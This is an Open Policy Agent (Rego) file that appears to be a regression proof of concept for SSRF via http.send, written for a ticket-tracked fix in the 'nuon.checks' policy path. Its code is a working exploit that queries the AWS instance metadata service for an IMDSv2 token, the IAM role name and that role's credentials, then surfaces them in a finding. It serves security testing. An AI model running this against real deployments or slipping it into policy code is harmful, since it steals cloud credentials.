package nuon.checks

import data.nuon.lib.check

# PRO-3595 PoC — SSRF to IMDS via OPA http.send (named-checks path).
#
# Same attack as ssrf-imds-aws-legacy.rego, but written against the newer
# `package nuon.checks` surface. This matters because the two packages compile
# and evaluate through different code paths:
#
#   legacy `package nuon`   -> evaluate_single_policy.go evaluateRule(...)
#   `package nuon.checks`   -> pkg/policies/opa Policy.Evaluate(...)
#
# The fix has to close BOTH; this file is the regression PoC for the second one.
# The recovered IMDS data is surfaced back through the finding message (local
# readback only — nothing is sent off-box).
#
# Expected behavior:
#   main (vulnerable): finding "check_ssrf_imds" fires with the leaked token.
#   fix branch:        Parse()/compile FAILS with "undefined function http.send".

imds := "http://169.254.169.254"

token := resp.raw_body if {
	resp := http.send({
		"method": "PUT",
		"url": sprintf("%s/latest/api/token", [imds]),
		"headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
		"raise_error": false,
	})
}

role := trim_space(resp.raw_body) if {
	resp := http.send({
		"method": "GET",
		"url": sprintf("%s/latest/meta-data/iam/security-credentials/", [imds]),
		"headers": {"X-aws-ec2-metadata-token": token},
		"raise_error": false,
	})
}

creds := resp.raw_body if {
	resp := http.send({
		"method": "GET",
		"url": sprintf("%s/latest/meta-data/iam/security-credentials/%s", [imds, role]),
		"headers": {"X-aws-ec2-metadata-token": token},
		"raise_error": false,
	})
}

check_ssrf_imds contains check.finding(msg) if {
	count(token) > 0
	msg := sprintf("PRO-3595 SSRF (named check) reached IMDSv2: role=%q credentials=%s", [role, creds])
}
